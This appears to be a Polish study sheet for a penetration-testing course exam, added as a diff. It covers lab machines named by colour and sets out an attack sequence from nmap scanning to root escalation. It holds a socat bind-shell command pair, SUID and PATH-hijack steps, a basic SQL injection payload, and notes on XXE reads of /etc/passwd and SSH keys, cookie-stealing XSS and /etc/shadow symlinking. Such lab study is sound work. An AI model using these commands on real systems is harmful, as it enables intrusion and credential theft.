@@ -1,0 +1,90 @@
+Opracowanie do kolokwium - Beginner's Path
+Komendy
+nmap -Pn -sV --script "default or vuln" -p- -vv <IP>  → pełne skanowanie usług
+nc <IP> <port>  → połączenie z portem (test usług)
+socat TCP-LISTEN:11111,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane 
+socat FILE:`tty`,raw,echo=0 TCP:<IP_SERWERA>:11111
+→ uruchomienie bind shell
+find / -perm -4000 -type f -exec ls -la {} + 2>/dev/null | sort
+scp <plik> user@host:/ścieżka → przesyłanie plików przez SSH
+strings <plik> → odczyt ciągów tekstowych z pliku binarnego
+ln -s <plik> <link> → tworzenie linku symbolicznego
+echo 'user:pass' | chpasswd → zmiana hasła użytkownika
+
+echo 'hasło' | su -c <komenda> → wykonanie polecenia jako root
+cat <plik> → odczyt pliku
+export PATH=/kontrolowany_katalog:$PATH → manipulacja PATH w celu przejęcia SUID
+Narzędzia
+Nmap → skanowanie portów i usług
+Netcat (nc) → testowanie połączeń, banery, porty
+Socat → tworzenie powłok (bind/reverse shell)
+Dirbuster/Gobuster → enumeracja katalogów i subdomen
+Exiftool → modyfikacja metadanych (webshell w jpg)
+GTFOBins → baza metod eskalacji uprawnień
+
+SSH/SCP → zdalne połączenia i transfer plików
+Strings → analiza plików binarnych
+
+Jak rozwiązywać problemy
+1. Uruchom nmap i sprawdź porty.
+2. Jeśli jest port 80/443 → sprawdź serwer WWW, źródło HTML, ciasteczka, panele logowania.
+3. Jeśli jest dostępne SSH → spróbuj użyć wcześniej złamanych haseł.
+4. Jeśli znajdziesz SUID w /opt → sprawdź kod źródłowy lub strings, szukaj przepełnień bufora lub manipulacji PATH.
+5. Jeśli jest baza danych → spróbuj SQL Injection lub użyj wykradzionych danych logowania.
+6. Jeśli jest webshell → spróbuj RCE (id, ls, bash).
+7. Eskalacja: sprawdzaj sudo -l, cron, pliki w katalogach domowych, .bash_history, grupy użytkowników (np. lxd).
+Kolejność działań na kolokwium
+1. Skan nmap.
+2. Sprawdź porty (HTTP, SSH, inne).
+3. HTTP → przeglądaj stronę, źródło, ciasteczka, dirbuster/gobuster.
+4. Spróbuj domyślnych loginów/SQLi/webshell.
+5. Uzyskaj pierwszą powłokę (RCE, nc, socat).
+6. Zbadaj SUID w /opt.
+7. Wykorzystaj błąd (overflow, PATH hijack, strcmp, trap).
+8. Użyj GTFOBins jeśli sudo dostępne.
+9. Eskalacja do roota i sprawdzenie /root/root.txt.
+Lista do powtórki
+Podstawowe komendy Linux: ls, cat, echo, su, sudo, id.
+Nmap – opcje i interpretacja wyników.
+Netcat i socat – różnice, bind/reverse shell.
+Enumeracja WWW – dirbuster/gobuster, nagłówki HTTP, ciasteczka.
+SQL Injection – podstawowe payloady (' or 1=1 --).
+XSS – podstawowe payloady i kradzież ciasteczek.
+SUID – analiza kodu C, buffer overflow, manipulacja PATH.
+GTFOBins – znajomość kilku metod (apt, man, less, vi).
+Grupa lxd – eskalacja przez kontener.
+Symlinki i cron – wykorzystanie do eskalacji.
+Dodatkowe informacje z kolejnych maszyn
+Red
+Wordpress 5.0 podatny → użyć wpscan do wykrycia wersji, exploit w msfconsole.
+Plik wp-config.php → reuse hasła do logowania użytkownika (wordmasta).
+Sprawdzić wersję systemu → exploit suggester, użyć CVE-2021-3156 (sudo heap overflow).
+Deep Red
+Anonimowy FTP dostępny → logowanie anonymous.
+Załadować klucz publiczny SSH → potem zalogować się do SSH.
+Eksploatacja starej wersji FreeBSD → kompilacja exploita (np. 48644.c) i uruchomienie.
+Brown
+Path traversal w parametrze t.
+data: wrapper → wstrzyknięcie własnych danych.
+Template Injection (Smarty) → RCE, payloady z HackTricks.
+Cron uruchamia heartbeat.sh co minutę → można edytować, aby stworzyć backdoora.
+Deep Brown
+Aplikacja podatna na XXE → użycie curl do odczytu plików (/etc/passwd, id_rsa).
+Odczyt klucza SSH admina i logowanie.
+SUID w /opt używa ścieżki względnej → można oszukać go zmieniając katalog roboczy.
+Gray / Deep Gray
+Gray: logs.php → XSS do kradzieży ciasteczek admina.
+Gray: cron → ln -s /etc/shadow logs.txt, cron odczyta z roota.
+Deep Gray: brak logs.php → zamiast XSS używamy CSRF (payload reverse shell w username).
+Deep Gray: SUID z fd=3 otwartym na plik z hasłem → exploit rewind.c do ponownego odczytu.
+Blue
+SSL certyfikat → sprawdzić CN, dodać do /etc/hosts.
+Dirbuster → robots.txt → formularz uploadu, exiftool do webshella.
+RCE przez webshell, potem dostęp do 127.0.0.1:8080.
+Path Traversal w parametrach → eskalacja do root przez sudo managera.
+Purple / Deep Purple
+Purple: subdomeny → gobuster vhost, dodać do /etc/hosts.
+SQL Injection → bypass logowania, UNION SELECT → RCE.
+Eskalacja przez grupę lxd → kontener root, zmiana hasła roota.
+Deep Purple: dane MySQL → wgranie webshella przez SELECT INTO DUMPFILE.
+SUID: program ignoruje SIGTERM → użycie trap '' SIGTERM i uruchomienie bash -p.
